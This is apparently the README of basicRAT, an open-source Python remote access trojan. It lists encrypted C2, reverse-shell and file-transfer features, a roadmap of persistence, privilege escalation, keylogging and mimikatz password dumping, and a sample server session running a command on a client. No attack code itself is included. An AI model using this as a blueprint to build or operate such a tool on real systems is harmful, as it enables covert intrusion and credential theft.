# basicRAT

This is a Python RAT (Remote Access Trojan). basicRAT was created to maintain a clean design full-featured Python RAT. Currently a work in progress and still being hacked on.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform
* AES CBC encrypted C2 with D-H exchange
* Reverse shell
* File upload/download

## Todo
* Client binary generation tool (cross-platform)
  * Pyinstaller
  * Switch options for remote IP, port, crypto, key, protocol, etc
* Persistance (cross-platform)
  * Windows: Registry keys, WMIC, Startup Dir
  * Linux: Cron jobs, services, modprobe
* Additional Crypto
* Common C2 Protocols (HTTP, DNS)
* Privilege Escalation (getsystem-esque, dirty cow)
* Screenshot
* Keylogger
* Accept connection from multiple clients
* Toolkit (wget, unrar, unzip)
* Scanning utility
* Password dumping (mimikatz / gsecdump)
* Tunneling

## Usage
```
$ python basicRAT_server.py --crypto AES --port 1337

 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT

basicRAT server listening on port 1337...

[127.0.0.1] basicRAT> help

download <file> - Download a file.
help            - Show this help menu.
persistence     - Apply persistence mechanism.
rekey           - Regenerate crypto key.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.

[127.0.0.1] basicRAT> run uname -a
Linux sandbox3 4.8.2-c9 #1 SMP Thu Oct 20 04:08:21 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

## Authors
* Austin Jackson [@vesche](https://github.com/vesche)
* Skylar Curits  [@deadPix3l](https://github.com/deadPix3l)

## Other open-source Python RATs for Reference
* [ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)
* [sweetsoftware/Ares](https://github.com/sweetsoftware/Ares)
